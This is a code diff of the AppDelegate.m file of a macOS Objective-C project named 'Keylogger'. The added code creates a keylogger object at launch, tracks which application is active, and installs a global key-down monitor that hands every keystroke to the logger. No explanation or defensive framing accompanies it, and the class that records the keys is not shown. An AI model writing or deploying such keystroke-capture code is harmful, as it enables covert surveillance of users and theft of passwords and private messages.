@@ -1,10 +1,3 @@
-//
-//  AppDelegate.m
-//  Keylogger
-//
-//  Created by mosca1337 on 3/10/13.
-//  Copyright (c) 2013 mosca1337. All rights reserved.
-//
 
 #import "AppDelegate.h"
 
@@ -12,7 +5,22 @@
 
 - (void)applicationDidFinishLaunching:(NSNotification *)aNotification
 {
-    // Insert code here to initialize your application
+    keylogger = [[Keylogger alloc] init];
+    
+    //Notifications for active applications
+    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:keylogger
+                                                           selector:@selector(appDidActivate:)
+                                                               name:NSWorkspaceDidActivateApplicationNotification
+                                                             object:nil];
+    
+    //Notifications for key presses
+    [NSEvent addGlobalMonitorForEventsMatchingMask:NSKeyDownMask
+                                           handler:^ (NSEvent *event) {[keylogger handleKeyPress:event];}];
+
+}
+
+- (void)dealloc {
+    [[[NSWorkspace sharedWorkspace] notificationCenter] removeObserver:keylogger];
 }
 
 @end
